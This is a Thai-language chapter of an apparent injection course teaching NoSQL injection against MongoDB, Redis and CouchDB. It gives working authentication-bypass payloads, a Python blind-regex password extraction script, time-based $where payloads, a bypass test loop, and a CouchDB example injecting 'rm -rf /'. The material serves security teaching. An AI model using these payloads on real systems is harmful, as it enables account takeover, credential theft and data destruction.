# Part 026: NoSQL Injection

## ภาพรวม

NoSQL Injection เป็นการโจมตีประเภทหนึ่งที่อาศัยความแตกต่างของโครงสร้าง NoSQL databases เช่น MongoDB, CouchDB, Redis

**ขั้นตอนที่ 341-360**

---

## 341. MongoDB Injection Basics

### 41.1 MongoDB Query Operators

```
MongoDB ใช้ JSON สำหรับ queries แทน SQL

MySQL SQL:
SELECT * FROM users WHERE username='admin' AND password='pass'

MongoDB Query:
db.users.find({username: 'admin', password: 'pass'})
```

### 41.2 MongoDB Operators

```javascript
$eq  - equal to
$ne  - not equal to
$gt  - greater than
$gte - greater than or equal
$lt  - less than
$lte - less than or equal
$in  - in array
$nin - not in array
$and - logical AND
$or  - logical OR
$not - logical NOT
$regex - regular expression
$where - JavaScript expression
```

---

## 342. Authentication Bypass ใน MongoDB

### 42.1 $ne Operator Bypass

```javascript
// โค้ดปกติ (PHP)
db.users.find({
  username: $_POST['username'],
  password: $_POST['password']
})

// Inject $ne operator
// POST: username[$ne]=xxx&password[$ne]=xxx
db.users.find({
  username: {$ne: 'xxx'},  // ทุก user ที่ไม่ใช่ 'xxx'
  password: {$ne: 'xxx'}   // ทุก password ที่ไม่ใช่ 'xxx'
})
// คืนผู้ใช้ user แรกใน collection!
```

### 42.2 เทคนิค Injection ต่างๆ

```
# $ne bypass
username[$ne]=xxx&password[$ne]=xxx

# $gt bypass (ค่าที่มากกว่า '')
username[$gt]=&password[$gt]=

# $regex bypass
username[$regex]=admin.*&password[$regex]=.*

# $where bypass (JavaScript)
username[$where]=this.username.length>0&password=xxx
```

---

## 343. MongoDB Blind Injection

```python
import requests

url = "http://example.com/api/user"

# Boolean blind ผ่าน $regex
def test_char(position, char):
    payload = {
        'username': 'admin',
        'password[$regex]': f'^.{{{position-1}}}{char}.*$'
    }
    r = requests.post(url, json=payload)
    return 'success' in r.text

# หา password
charset = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$'
result = ''

for pos in range(1, 50):
    found = False
    for c in charset:
        if test_char(pos, c):
            result += c
            print(f'\r[+] Found so far: {result}', end='', flush=True)
            found = True
            break
    if not found:
        break

print(f'\n[+] Password: {result}')
```

---

## 344. MongoDB $where Injection (JavaScript)

```javascript
// $where ใช้ JavaScript expression
// สร้าง query ที่ซับซ้อนได้

// Bypass login
username[$where]=1==1
password=anything

// Sleep (time-based blind)
username[$where]=function(){sleep(5000); return 1;}

// Extract data ผ่าน time
username[$where]=function(){
  if(this.password.substring(0,1) == 'a') sleep(5000);
  return 1;
}
```

---

## 345. NoSQLMap Tool

```bash
# Install
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt
python nosqlmap.py

# Options:
# 1. Configuration
# 2. Set target host
# 3. Set app path
# 4. Set HTTP request type
# 5. Test injection
```

---

## 346. Redis Injection

```
# Redis ไม่ใช้ SQL หรือ JSON
# ใช้คำสั่งของตัวเอง

SET key value
GET key
DEL key
KEYS pattern
CONFIG GET *
CONFIG SET save ""

# SSRF ไป Redis (common attack)
# ส่ง Redis commands ผ่าน SSRF
GET http://127.0.0.1:6379/
→ -ERR wrong number of arguments for 'get' command
```

---

## 347. CouchDB Injection

```
# CouchDB ใช้ HTTP REST API
GET /_all_dbs
GET /database/_all_docs
GET /database/document_id

# JavaScript injection ผ่าน map/reduce
# ใน view definitions
{
  "map": "function(doc) { emit(doc._id, null); }"
}

# ถ้า input ไม่ถูก sanitize:
"map": "function(doc) { exec('rm -rf /'); }"
```

---

## 348. แบบฝึกหัด NoSQL Injection

```python
import requests

url = "http://example.com/api/login"

# ทดสอบ $ne bypass
payloads = [
    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
    {"username": "admin", "password": {"$ne": "x"}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
]

for payload in payloads:
    r = requests.post(url, json=payload)
    print(f"Status: {r.status_code} | Length: {len(r.text)}")
    if r.status_code == 200 and len(r.text) > 100:
        print(f"[+] BYPASS SUCCESSFUL: {payload}")
        break
```

---

## สรุป

NoSQL Injection:
- **MongoDB** - ใช้ operators ($ne, $gt, $regex, $where) เพื่อ bypass
- **$ne bypass** - เทคนิคยอดนิยมที่สุด
- **$where** - JavaScript injection ใน MongoDB
- **NoSQLMap** - เครื่องมือ automated

---

*Part 026 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
